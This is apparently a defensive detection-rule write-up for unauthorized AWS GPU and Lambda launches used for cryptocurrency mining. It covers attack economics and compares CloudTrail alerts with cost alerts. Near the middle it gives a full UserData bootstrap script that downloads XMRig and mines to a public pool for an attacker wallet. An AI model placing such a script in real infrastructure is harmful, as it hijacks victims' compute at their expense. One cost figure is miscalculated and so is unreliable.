# CDET-011 — Unauthorized Compute Resource Launch

**Tactic:** Impact  
**MITRE ATT&CK:** T1496 — Resource Hijacking  
**Severity:** High  
**Data Source:** AWS CloudTrail

---

## Technique Overview

Resource hijacking in AWS involves an attacker launching unauthorized compute resources — typically EC2 instances or Lambda functions — to perform cryptocurrency mining at the victim organization's expense. The attacker has zero infrastructure cost; the victim pays the AWS bill. Unlike traditional data theft, resource hijacking directly converts compromised AWS access into immediate financial value for the attacker.

---

## Why GPU Instances Are Targeted

Modern cryptocurrency mining, particularly for Ethereum (prior to Proof-of-Stake), Monero, Ravencoin, and other GPU-mineable coins, performs best on high-end GPUs. AWS offers several GPU-accelerated instance families that are prime targets:

**p3 family (NVIDIA Tesla V100 GPUs)**:
- `p3.2xlarge`: 1 GPU, ~$3.06/hr
- `p3.8xlarge`: 4 GPUs, ~$12.24/hr
- `p3.16xlarge`: 8 GPUs, ~$24.48/hr

**p4d family (NVIDIA A100 GPUs)**:
- `p4d.24xlarge`: 8 A100 GPUs, ~$32.77/hr

**g4dn family (NVIDIA T4 GPUs — cost-effective for mining)**:
- `g4dn.xlarge`: 1 T4, ~$0.526/hr — commonly chosen for balance of mining performance and detectability
- `g4dn.12xlarge`: 4 T4s, ~$3.912/hr

**Attack scale economics**: An attacker who launches 100 `p3.16xlarge` instances runs up a bill of approximately **$57,600 per day** ($2,400/hr × 24). This bill lands entirely on the victim's AWS account.

---

## The Attack Economics

Cryptocurrency mining profitability depends on:
- **Hash rate**: GPU count and generation determine mining speed
- **Electricity cost**: Zero for the attacker (charged to victim's AWS bill)
- **Coin market price**: Fluctuates but Monero (XMR) is specifically designed for CPU/GPU mining and ASIC resistance

An attacker who runs 20 `g4dn.xlarge` instances for one week:
- AWS bill to victim: ~$1,465 (20 × $0.526 × 168 hours)
- Monero mined (approximate, varies by difficulty): $800–$1,200 at common XMR difficulty
- Attacker profit: Coins, victim's loss: bill plus incident response costs

The attacker typically maintains access until the AWS account is suspended for non-payment or the compromise is detected.

---

## Common Mining Software Deployed

Attackers bootstrap mining software via EC2 UserData (a startup script) or Lambda function code:

**XMRig**: The most common CPU/GPU Monero miner. Open source, configurable, supports all major GPU types. Typically downloaded from GitHub releases in UserData.

**TeamRedMiner / lolMiner**: GPU miners targeting AMD and NVIDIA cards respectively, used for non-XMR coins.

**T-Rex Miner**: Popular NVIDIA GPU miner for multiple algorithms.

Attackers configure miners to connect to public mining pools (pool.supportxmr.com, xmrpool.eu, minexmr.com) using a wallet address they control. Mining pool payouts go directly to the attacker's wallet.

A typical UserData mining bootstrap:
```bash
#!/bin/bash
# Run as root at instance startup
apt-get update -y
wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
tar -xzf xmrig-*.tar.gz
./xmrig-*/xmrig -o pool.minexmr.com:4444 -u ATTACKER_WALLET_ADDRESS -p x --background
```

---

## Lambda Functions as a Mining Vector

EC2 GPU instances are the primary target, but Lambda functions offer stealth and lower per-unit cost:

- Lambda functions can run for up to **15 minutes** per invocation
- CPU-based mining (XMRig CPU mode) runs during the Lambda execution window
- Lambda is billed per-millisecond at $0.0000000167/GB-second
- An attacker who triggers thousands of concurrent Lambda invocations performs distributed mining at low cost
- Lambda's serverless nature means there is no persistent instance to detect via EC2 inventory

Lambda mining is less efficient than GPU mining but harder to detect because Lambda functions are numerous in modern architectures and individual invocations are short-lived.

---

## Detection Gaps: Cost Anomaly Alerts vs. Security Events

AWS Cost Anomaly Detection and AWS Budgets can generate billing alerts when spending exceeds thresholds. However, these controls have significant gaps compared to security event detection:

| Factor | Cost Anomaly Alert | CDET-011 (Security Event) |
|--------|-------------------|--------------------------|
| **Latency** | Hours to days (billing delay) | Minutes (CloudTrail) |
| **Context** | $ amount only | Instance type, AMI, UserData, IAM principal |
| **Action signal** | "Spending is up" | "Specific IAM user launched GPU instances" |
| **Forensic value** | None | Full call chain, source IP, session context |
| **Pre-launch detection** | Impossible | Can detect immediately at RunInstances |

A security event-based detection (CDET-011) catches the attack at the `RunInstances` API call — before any mining occurs and before any significant cost is incurred. Cost anomaly detection triggers only after the bill has already been generated.

---

## References

- MITRE ATT&CK T1496: https://attack.mitre.org/techniques/T1496/
- AWS EC2 GPU Pricing: https://aws.amazon.com/ec2/pricing/on-demand/
- XMRig: https://github.com/xmrig/xmrig
- AWS Cost Anomaly Detection: https://aws.amazon.com/aws-cost-management/aws-cost-anomaly-detection/
